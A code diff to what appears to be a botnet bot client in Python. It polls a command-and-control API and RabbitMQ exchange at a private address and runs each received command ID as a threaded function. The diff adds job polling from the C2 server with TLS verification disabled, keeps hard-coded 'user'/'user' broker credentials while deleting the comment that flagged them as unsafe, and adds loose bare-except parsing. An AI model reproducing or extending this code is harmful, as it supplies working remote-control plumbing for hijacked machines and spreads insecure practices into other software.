@@ -19,10 +19,20 @@ class Client():
         self.botnet_id = 0
         self.bot_id = 0
         self.botnet_job_id = 0
-        # TODO: unsafe credentials
         self.credentials = pika.PlainCredentials('user', 'user')
         self.parameters = pika.ConnectionParameters('192.168.0.114', 5672, '/', self.credentials)
         self.connection = pika.BlockingConnection(self.parameters)
+
+
+    def init_check_for_jobs(self):
+        url = "https://192.168.0.114:45455/api/v1/BotnetJob/" + str(self.botnet_id)
+        bot_data = requests.get(url=url, verify=False)
+        print(bot_data)
+        print(self.bot_id)
+        print(url)
+        if bot_data.status_code == 200:
+            print("There")
+            self.execute_command(None, None, None, bot_data.json())
 
 
     def register_bot(self):
@@ -39,6 +49,7 @@ class Client():
 
 
     def listen_for_commands(self):
+        self.init_check_for_jobs()
         queue_name = "c2commands" + str(self.bot_id)
         exchange_name = "C2Commands" + str(self.botnet_id)
         channel = self.connection.channel()
@@ -51,16 +62,25 @@ class Client():
 
     def execute_command(self, ch, method, properties, body):
         print("[+] Got command")
-        body = body.decode()
-        job_data = json.loads(body)
-        self.botnet_job_id = job_data['Id']
-        job_action = job_data['JobAction']
-        command_id = job_data['CommandId']
-        command_args = job_data['CommandArgument']
-        
+
+        try:
+            body = body.decode()
+            body = json.loads(body)
+            self.botnet_job_id = body['Id']
+            job_action = body['JobAction']
+            command_id = body['CommandId']
+            command_args = body['CommandArgument']
+        except:
+            self.botnet_job_id = body['id']
+            job_action = body['jobAction']
+            command_id = body['commandId']
+            command_args = body['commandArgument']
+
+
         if job_action == "Stop":
             self.stop_job()
         elif job_action == "Start":
+            # TODO: check if another command is running
             command_function = self.commands[command_id]
             self.event_controller.set()
             thread = threading.Thread(target=command_function, args=(command_args,))
@@ -75,7 +95,7 @@ class Client():
             self.botnet_job_id = 0
             self.finish_command("Stopped")
 
-    
+
     def command_wrapper(command):
         def command_controller(self, command_args):
             url = "https://192.168.0.114:45456/api/v1/Bots/bot/" + str(self.bot_id)
@@ -153,3 +173,5 @@ if __name__ == "__main__":
     client.botnet_id = 1
     client.bot_id = 1
     client.listen_for_commands()
+
+
